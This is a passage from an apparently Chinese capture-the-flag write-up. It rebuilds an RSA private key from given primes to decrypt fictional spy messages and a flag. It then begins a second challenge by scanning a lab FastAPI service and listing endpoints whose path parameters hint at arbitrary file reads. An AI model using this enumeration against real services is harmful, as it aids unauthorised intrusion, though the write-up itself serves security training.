operator">+</span>bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb<span class="token operator">+</span>SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6<span class="token operator">/</span>LdhqsTNelXl<span class="token operator">/</span>Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG<span class="token operator">+</span>S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB<span class="token operator">/</span>hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX<span class="token operator">/</span>9eBkznEhzeWnJ1yMsYkj<span class="token operator">+</span>ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme<span class="token operator">+</span>T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">05</span>ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA<span class="token operator">/</span>ICJR7WrwWsVinr6y3u9w<span class="token operator">+</span>ubMZ0mqmtnphzQraagk8NkKc1u1<span class="token operator">+</span>qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi<span class="token operator">+</span>1Aunmy6DeOKRkFwysnrSco5QiiC9<span class="token operator">+</span>gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3<span class="token operator">/</span>Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU<span class="token operator">+</span>iiN4offwrQyr4eEu9ecvmyD2w<span class="token operator">/</span>n7pAOsVnqSzroBujVA<span class="token operator">+</span>CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf<span class="token operator">+</span>MnMQPr80uoxT3mz8IX8pyVnyyw1x6F<span class="token operator">+</span>IK1I2G<span class="token operator">+</span>5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6<span class="token operator">/</span>5Sz1noJrsu6k6WN8ZM0MyRIav<span class="token operator">+</span>xuKP1<span class="token operator">+</span>cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA<span class="token operator">/</span>cEjOICWVzUXwbE5wWUBPCLp2C<span class="token operator">/</span>XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk<span class="token operator">/</span>ahaxdGxGa9CrRyr6sf<span class="token operator">+</span>goA<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用hint.txt给的p，q生成私钥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAe <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span>q <span class="token operator">=</span> <span class="token number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span>private <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"privatekey.pem"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>private<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231212646503.png" alt="image-20241231212646503"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">2024-03-05Park:总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 发送人：Dylan2024-04-11Park:【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 发送人：Dylan2024-12-16Park:你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】发送人：Dylan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;https://task.ctfer.com&#125;</code></p><hr><h2 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h2><p>启动靶机，dirsearch 扫出 openapi.json，是个 fastapi 服务</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.1.0"</span><span class="token punctuation">,</span>  <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"FastAPI"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"/login"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Login"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"login_login_post"</span><span class="token punctuation">,</span>        <span class="token property">"requestBody"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"application/x-www-form-urlencoded"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Body_login_login_post"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Token"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Root"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"root__get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_newest"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Newest"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_newest_task_newest_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_completed"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Completed"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_completed_task_completed_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_cancelled"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Cancelled"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_cancelled_task_cancelled_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_inbox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Inbox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_inbox_message_inbox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_sent"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Sent"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_sent_message_sent_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/messageBox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Messagebox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"messageBox_messageBox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/listTaskFiles"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Listtaskfiles"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"listTaskFiles_listTaskFiles_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/readTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Readtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"readTaskFile_readTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token 